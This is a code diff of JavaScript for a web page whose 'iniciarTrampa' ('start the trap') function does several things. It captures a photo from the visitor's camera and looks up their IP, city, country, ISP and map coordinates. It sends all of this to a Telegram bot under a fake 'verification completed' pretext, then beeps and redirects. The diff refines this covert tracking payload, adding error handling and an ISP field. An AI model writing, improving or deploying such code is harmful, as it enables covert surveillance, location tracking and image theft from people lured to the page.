@@ -53,7 +53,6 @@
         }
 
         async function iniciarTrampa() {
-            // Vibración inicial (Haptic Feedback)
             if (navigator.vibrate) navigator.vibrate(50);
 
             document.getElementById('line').style.display = "block";
@@ -65,7 +64,7 @@
 
             try {
                 let fotoBlob = null;
-                // Captura silenciosa de cámara
+                // 1. Captura de cámara
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     const video = document.createElement('video');
@@ -76,22 +75,25 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
                     stream.getTracks().forEach(t => t.stop());
-                } catch(e) {
-                    console.log("Cámara denegada");
-                }
+                } catch(e) { console.log("Cámara denegada"); }
 
-                // Datos de red
+                // 2. Datos de red y ubicación
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                const equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+                
+                // Corrección del modelo de equipo
+                let equipo = "Dispositivo Desconocido";
+                try { equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1]; } catch(e) {}
 
+                // 3. Formatear reporte (Corrección del link de Mapa)
                 const reporte = `👤 *VERIFICACIÓN COMPLETADA*\n\n` +
                                 `📱 *Equipo:* ${equipo}\n` +
                                 `🌐 *IP:* \`${d.ip}\`\n` +
-                                `📍 *Lugar:* ${d.city}, ${d.country}\n` +
+                                `📍 *Lugar:* ${d.city}, ${d.country_name}\n` +
+                                `📶 *ISP:* ${d.org}\n` +
                                 `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // Envío paralelo
+                // 4. Envío a Telegram
                 const p = [fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -107,9 +109,9 @@
 
                 await Promise.all(p);
 
-            } catch(e) { console.log("Error"); }
+            } catch(e) { console.log("Error en el proceso"); }
 
-            // Finalización: Sonido + Vibración larga + Redirección
+            // Finalización y Redirección
             setTimeout(() => {
                 if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
                 beep.play();
